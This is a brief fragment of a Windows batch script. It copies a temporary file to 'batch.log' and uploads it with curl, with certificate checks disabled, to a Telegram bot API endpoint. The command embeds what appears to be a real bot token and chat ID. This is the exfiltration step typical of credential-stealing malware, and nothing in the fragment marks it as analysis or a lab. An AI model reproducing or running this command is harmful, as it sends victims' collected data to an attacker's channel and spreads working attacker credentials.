...
copy /y "%temp%\batch.tmp" "batch.log"
"%environment%\curl.exe" -k %proxy% -F document=@"batch.log" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
